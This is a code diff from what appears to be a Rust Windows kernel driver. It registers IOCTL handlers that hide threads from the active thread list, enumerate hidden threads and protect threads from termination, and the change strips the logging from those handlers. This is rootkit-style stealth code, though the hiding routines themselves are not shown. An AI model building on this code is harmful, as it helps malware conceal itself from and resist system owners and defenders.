@@ -32,7 +32,6 @@ use {
 pub fn get_thread_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Hide the specified Thread by removing it from the list of active threads.
     ioctls.insert(IOCTL_HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_HIDE_UNHIDE_THREAD");
         let status = unsafe { handle!(stack, Thread::thread_toggle, TargetThread) };
         unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
         status
@@ -40,7 +39,6 @@ pub fn get_thread_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
 
     // List hidden or protected threads.
     ioctls.insert(IOCTL_ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_ENUMERATION_THREAD");
         let mut information = 0;
         let status = unsafe { handle!(irp, stack, Thread::enumerate_thread_toggle, EnumerateInfoInput, ThreadListInfo , &mut information) };
         unsafe { (*irp).IoStatus.Information = information as u64 };
@@ -49,7 +47,6 @@ pub fn get_thread_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
 
     // Responsible for adding thread termination protection.
     ioctls.insert(IOCTL_PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_PROTECTION_THREAD");
         let status = unsafe { handle!(stack, add_remove_thread_toggle, ThreadProtection) };
         unsafe { (*irp).IoStatus.Information = size_of::<TargetThread> as u64 };
         status
